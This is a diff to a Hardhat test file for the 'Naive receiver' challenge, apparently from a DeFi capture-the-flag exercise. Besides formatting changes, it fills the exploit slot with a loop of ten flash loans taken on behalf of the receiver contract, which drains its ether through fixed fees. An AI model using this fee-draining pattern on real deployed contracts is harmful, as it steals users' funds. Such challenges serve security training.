@@ -1,5 +1,5 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const {ethers} = require('hardhat');
+const {expect} = require('chai');
 
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, attacker;
@@ -18,19 +18,21 @@ describe('[Challenge] Naive receiver', function () {
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
 
         this.pool = await LenderPoolFactory.deploy();
-        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
-        
+        await deployer.sendTransaction({to: this.pool.address, value: ETHER_IN_POOL});
+
         expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
         expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
-        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
+        await deployer.sendTransaction({to: this.receiver.address, value: ETHER_IN_RECEIVER});
+
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        for (let i = 0; i < 10; i++)
+            this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'))
     });
 
     after(async function () {
